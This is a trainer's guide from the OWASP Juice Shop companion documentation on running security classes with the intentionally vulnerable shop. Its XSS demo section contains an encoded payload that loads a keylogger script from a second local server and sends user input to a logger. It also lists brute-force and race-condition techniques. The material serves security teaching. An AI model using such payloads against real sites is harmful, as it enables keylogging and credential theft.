---
title: "Trainer's guide"
source: https://pwning.owasp-juice.shop/companion-guide/latest/part4/trainers.html
tags: [juiceshop, owasp, companion-guide]
---

# Trainer's guide

← Previous: [[05 Setting up the Juice Shop Lego Tower|Setting up the Juice Shop Lego Tower]]
Next: [[07 Vendor's guide|Vendor's guide]] →

Co-authored by [Timo Pagel](https://github.com/wurstbrot)

## Instances

Make sure all participants have their own running Juice Shop instance to work with. While attempting challenges like [[11 Insecure Deserialization|RCE]] or [[06 XML External Entities (XXE)|XXE]] students might occasionally take down their server and would severely impact other participants if they shared an instance.

There are multiple [[02 Running OWASP Juice Shop|Run Options]] which you can choose from. It is perfectly fine to run multiple docker containers on one host. They do not effect each other.

## Customization

Especially in awareness trainings for management you might want to create a higher immersion by making the Juice Shop look like an application in the corporate design of the participants' own company. Juice Shop offers [[02 Customization|various customization options]] to achieve this.

Several custom configurations already come packaged with the Juice Shop source code, the two most sophisticated ones being [7 Minute Security](https://github.com/juice-shop/juice-shop/blob/master/config/7ms.yml) and [Mozilla](https://github.com/juice-shop/juice-shop/blob/master/config/mozilla.yml).

In addition, you might want to disable all challenge notifications during awareness trainings to avoid distraction. The [Quiet](https://github.com/juice-shop/juice-shop/blob/master/config/quiet.yml) configuration demonstrates the necessary options to achieve this.

![[part4-trainers-quiet_mode.png]]

For a really sophisticated and immersive demo consider performing some [[02 Customization|Additional Browser tweaks]]. These will let you use OAuth2 login via Google and cast the illusion that coupon codes were actually tweeted by your customer’s company.

## Classroom hints

In a classroom setup you have to find a way to distribute the URL of each instance to the participants. For small groups, it is probably fine to just spin up a number of containers and tell all participants which URL they have to use. An example to spin up 10 Docker containers on a UNIX based system is to run

``` text
for i in {10..19}; do docker run -d -p 40$i:3000 bkimminich/juice-shop; done
```

### Hosting individual instances for multiple users

![[part4-trainers-multi-juicer_cover.svg]]

For a more sophisticated way to host and manage multiple Juice Shop instances we recommend [MultiJuicer](https://github.com/juice-shop/multi-juicer/). Learn all about this official platform of Juice Shop [[03 Hosting platform for multiple users|in this dedicated chapter]].

### Central progress tracking

If you want to track progress centrally and independent of your chosen hosting platform during the training, you might want to [[04 Hosting a CTF event|host a central CTF server]] where participants can post the challenges they already solved. You might consider turning off public visibility of the leader board on the CTF server unless you want to encourage the students to hack very competitively.

## Existing trainings

One existing training which uses the Juice Shop for example is [Timo Pagel’s University Module](https://drive.google.com/open?id=1ITkTAALjZJnGV-hhAZ-zQfNx1sVTzlA2UlWD0s270ig). The structure mostly is as follows:

1. Introduce a topic (e.g. SQL Injection)

2. Let the participants try it out in the Juice Shop

3. Show mitigation/counter measures

The 2nd semester web attack chapters of [Björn Kimminich’s IT Security Lecture](https://github.com/bkimminich/it-security-lecture) follow a similar pattern of

1. Introduction

2. Timeboxed exercise

3. Demonstration of the hack (for all who did not finish the exercise in time)

4. Explaining mitigation and prevention

You can find more links to existing material in the [Lectures and Trainings section](https://github.com/juice-shop/juice-shop/blob/master/REFERENCES.md#lectures-and-trainings) of the project references on on GitHub.

## Challenges for demos

The following challenges are well suited for live demonstrations in trainings or talks. You should **always** begin by showing how to find the [[02 Finding the Score Board|Score Board]] ( ⭐ ) so you can then pick any of the challenge below to further demonstrate certain categories of vulnerabilities.

| Challenge | Category | Difficulty | Time for demo | Dependencies |
|---|---|---|---|---|
| [[10 Cross Site Scripting (XSS)\|DOM XSS]] | XSS | ⭐ | ⏳ | None |
| [[05 Sensitive Data Exposure\|Confidential Document]] | Sensitive Data Exposure | ⭐ | ⏳ | None |
| [[03 Injection\|Login Admin]] | Injection | ⭐⭐ | ⏳ | None |
| [[18 Miscellaneous\|Privacy Policy]] | Miscellaneous | ⭐ | ⏳ | Log in as any user |
| [[10 Cross Site Scripting (XSS)\|Reflected XSS]] | XSS | ⭐⭐ | ⏳⏳ | Log in as any user and complete checkout process (to find the vulnerable tracking link) |
| [[13 Security through Obscurity\|Privacy Policy Inspection]] | Security through Obscurity | ⭐⭐⭐ | ⏳⏳ | [[18 Miscellaneous\|Privacy Policy]] |
| [[08 Broken Access Control\|Admin Section]] | Broken Access Control | ⭐⭐ | ⏳⏳ | [[03 Injection\|Login Admin]] or [[07 Improper Input Validation\|Admin Registration]] |
| [[08 Broken Access Control\|View Basket]] | Broken Access Control | ⭐⭐ | ⏳⏳ | Log in with two different users |
| [[08 Broken Access Control\|Easter Egg]] | Broken Access Control | ⭐⭐⭐⭐ | ⏳⏳⏳ | Explain *Poison Null Byte* |
| [[16 Cryptographic Issues\|Nested Easter Egg]] | Cryptographic Issues | ⭐⭐⭐⭐ | ⏳⏳⏳ | [[08 Broken Access Control\|Easter Egg]] |
| [[05 Sensitive Data Exposure\|Forgotten Developer Backup]] | Sensitive Data Exposure | ⭐⭐⭐⭐ | ⏳⏳⏳ | Explain *Poison Null Byte* |
| [[16 Cryptographic Issues\|Forged Coupon]] | Cryptographic Issues | ⭐⭐⭐⭐⭐⭐ | ⏳⏳⏳⏳ | [[05 Sensitive Data Exposure\|Forgotten Developer Backup]] and `z85-cli` installed **or** [[05 Sensitive Data Exposure\|Forgotten Sales Backup]] **or** tracing coupons from Twitter back to [https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22](https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22) |

### XSS demo

A particularly impressive [showcase of XSS site-defacement combined with a keylogger](https://github.com/wurstbrot/shake-logger) is provided explicitly for live demos and awareness trainings:

1. Install [Docker](https://www.docker.com/).

2. Run `git clone https://github.com/wurstbrot/shake-logger`.

3. Run `cd shake-logger` and then `docker-compose up`.

4. Turn on your speakers and make sure your browser is allowed to play sound.

5. Open [this link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) to launch the XSS demo (🔊).

6. Use the application normally, e.g. doing a search and logging in with some user.

7. In a new tab go to [http://localhost:8080/logger.php](http://localhost:8080/logger.php) to see that all user input was transmitted to a third-party server.

8. Show the Network tab of the browser window with Juice Shop to see the requests that are sent to the `logger.php` script.

9. Reload the Juice Shop with `F5` and use the application a bit more.

10. You will see that no more logging takes place as XSS payload was removed during the reload.

There is also a video recording available on YouTube: [https://youtu.be/Msi52Kicb-w](https://youtu.be/Msi52Kicb-w). This is a good fallback in case the Docker-based setup does not work for you.

## Teaching automation of security tools

Only a few challenges in OWASP Juice Shop are *explicitly* expecting to utilize the power of automation, mostly in the form of some brute force attack. Quite a few more challenges are still *well-suited* for teaching the use of automated tools . The following table gives you an idea on complexity and expected time consumption for each of these, so you can plan your training accordingly.

| Tool | Description | Effort to automate | Execution runtime | Challenges (Auto-solve?) |
|---|---|---|---|---|
| ZAP *Traditional Spider* or *Forced Browse* with [small (or bigger) OWASP DirBuster list](https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-small.txt) | Finds `/ftp` folder with many misplaced files *and* `/promotion` (and direct `/video`) path with jingle video | 🧠 | ⏳⏳ | Confidential Document(❌), Forgotten Developer Backup(❌), Forgotten Sales Backup(❌), Misplaced Signature File(❌), Login Support Team(❌), Video XSS(❌) |
| ZAP *Forced Browse* with [big OWASP DirBuster list](https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-big.txt) | Finds `/encryptionkeys` directory with `jwt.pub` *and* `premium.key` key files | 🧠 | ⏳⏳⏳ | Forged Signed JWT(❌), Premium Challenge(❌) |
| [RaceTheWeb](https://github.com/aaronhnatiw/race-the-web) config (or custom Bash, Python etc. script) sending 10 sequential `POST` requests to [Feedback API endpoint](http://localhost:3000/api/Feedbacks) within 10 seconds | Must pin `captchaId` and `captcha` from one initially received and solved CAPTCHA | 🧠(🧠) | ⏳ | CAPTCHA Bypass(✔️) |
| Burpsuite (Community Edition) *Repeater* with [Top Names Over the Last 100 Years](https://www.ssa.gov/oact/babynames/decades/century.html) into [Password Reset API endpoint](http://localhost:3000/rest/user/reset-password) for email `jim@juice-sh.op` | Contains answer to Jim’s security question as 44th of Top 100 male names of 1919-2018. List needs to be manually prepared from HTML page. | 🧠🧠 | ⏳⏳ | Reset Jim’s Password(✔️) |
| [RaceTheWeb](https://github.com/aaronhnatiw/race-the-web) config (or custom Bash, Python etc. script) sending 3 simultaneous `POST` requests to [Like Reviews API endpoint](http://localhost:3000/rest/products/reviews) | Requests must be processed within 150ms time window to exploit race condition flaw | 🧠(🧠🧠) | ⏳ | Multiple Likes(✔️) |

[[05 Setting up the Juice Shop Lego Tower|Juice Shop Lego Tower]] [[07 Vendor's guide|Vendor’s guide]]

